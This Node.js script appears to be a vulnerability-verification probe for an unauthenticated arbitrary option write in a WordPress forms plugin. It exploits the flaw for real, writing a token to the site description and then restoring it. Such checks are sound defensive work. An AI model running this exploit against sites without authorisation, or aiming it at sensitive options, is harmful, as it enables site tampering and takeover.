// Exploit-verification probe: Old Forms <= 1.4.2, unauthenticated of_save_field
// (wp_ajax_nopriv_of_save_field -> update_option($_POST['key'], ...) with no capability
// or key allow-list).
//
// Usage: node probe.mjs <base-url>
// Exit 0 = target IS vulnerable (unauthenticated option write confirmed)
// Exit 1 = target NOT vulnerable (or the check could not be completed)
//
// Strategy: use a harmless, publicly-visible option (blogdescription). Read its current
// value from the public REST root, write a unique token via the unauthenticated action,
// confirm the token shows up in the public REST root, then restore the original value.
// Only requests to the given base URL are sent. No filesystem writes.

import { randomBytes } from 'node:crypto';

const TIMEOUT_MS = 10000;
const TEST_KEY = 'blogdescription';

function log(msg) {
	process.stderr.write(`[probe] ${msg}\n`);
}

const rawBase = process.argv[2];
if (!rawBase) {
	log('usage: node probe.mjs <base-url>');
	process.exit(1);
}

let base;
try {
	base = new URL(rawBase);
	if (base.protocol !== 'http:' && base.protocol !== 'https:') {
		throw new Error('base URL must be http or https');
	}
} catch (err) {
	log(`invalid base URL: ${err.message}`);
	process.exit(1);
}
const origin = base.origin;

function restUrl() {
	return `${origin}/?rest_route=/`;
}

function ajaxUrl() {
	return `${origin}/wp-admin/admin-ajax.php`;
}

async function readSiteDescription() {
	const res = await fetch(restUrl(), { signal: AbortSignal.timeout(TIMEOUT_MS) });
	if (!res.ok) {
		throw new Error(`REST root HTTP ${res.status}`);
	}
	const json = await res.json();
	if (typeof json.description !== 'string') {
		throw new Error('REST root did not expose a description field');
	}
	return json.description;
}

async function saveField(key, value) {
	const body = new URLSearchParams({ action: 'of_save_field', key, value });
	const res = await fetch(ajaxUrl(), {
		method: 'POST',
		headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
		body,
		signal: AbortSignal.timeout(TIMEOUT_MS),
	});
	const text = await res.text();
	let json = null;
	try {
		json = JSON.parse(text);
	} catch {
		// non-JSON response; treated as failure below
	}
	return { status: res.status, ok: res.ok && json !== null && json.success === true };
}

async function main() {
	let original = null;
	let changed = false;
	let exploitable = false;

	try {
		original = await readSiteDescription();
		log(`baseline blogdescription read (length ${original.length})`);

		const token = `probe-${randomBytes(12).toString('hex')}`;
		const write = await saveField(TEST_KEY, token);
		if (!write.ok) {
			log(`unauthenticated of_save_field did not succeed (HTTP ${write.status})`);
			return false;
		}
		changed = true;

		const after = await readSiteDescription();
		if (after === token) {
			log('unauthenticated write to an arbitrary option CONFIRMED');
			exploitable = true;
		} else {
			log('write returned success but the option value did not change');
		}
	} catch (err) {
		log(`check error: ${err.message}`);
		exploitable = false;
	} finally {
		if (changed && original !== null) {
			try {
				const restore = await saveField(TEST_KEY, original);
				if (restore.ok) {
					log('original blogdescription restored');
				} else {
					log(`WARNING: restore failed (HTTP ${restore.status}); original value was not reinstated`);
				}
			} catch (err) {
				log(`WARNING: restore error: ${err.message}`);
			}
		}
	}
	return exploitable;
}

const vulnerable = await main();
log(vulnerable ? 'RESULT: VULNERABLE' : 'RESULT: NOT VULNERABLE');
process.exit(vulnerable ? 0 : 1);
